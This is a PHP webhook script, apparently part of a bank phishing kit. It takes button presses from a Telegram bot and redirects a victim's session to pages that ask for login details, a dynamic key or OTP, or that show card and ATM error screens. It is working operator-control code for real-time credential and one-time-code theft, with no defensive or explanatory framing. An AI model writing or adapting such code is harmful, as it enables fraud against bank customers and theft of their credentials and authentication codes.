<?php
$config = require __DIR__ . '/../config.php';
$update = json_decode(file_get_contents('php://input'), true);

if (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $callback_data = explode(':', $callback_query['data']);
    $action = $callback_data[0] ?? null;
    $transaction_id = $callback_data[1] ?? null;

    session_start();
    $_SESSION['current_transaction'] = $transaction_id;

    // ✅ Mapeo actualizado con todas las acciones posibles
    $routes = [
        'pedir_logo'     => 'logo',
        'pedir_dinamica' => 'dinamica',
        'pedir_otp'      => 'otp',
        'error_tc'       => 'error_tc',
        'error_logo'     => 'error_logo',
        'error_cajero'   => 'error_cajero', // ← esta línea fue añadida
        'finalizar'      => 'finalizado'
    ];

    if (isset($routes[$action])) {
        $_SESSION['current_action'] = $routes[$action];
        $_SESSION['redirect_url'] = "{$routes[$action]}.php";
    }

    $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/answerCallbackQuery");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode([
            'callback_query_id' => $callback_query['id'],
            'text' => 'Procesando solicitud...',
            'show_alert' => false
        ]),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json']
    ]);
    curl_exec($ch);
    curl_close($ch);
}

http_response_code(200);
echo "OK";
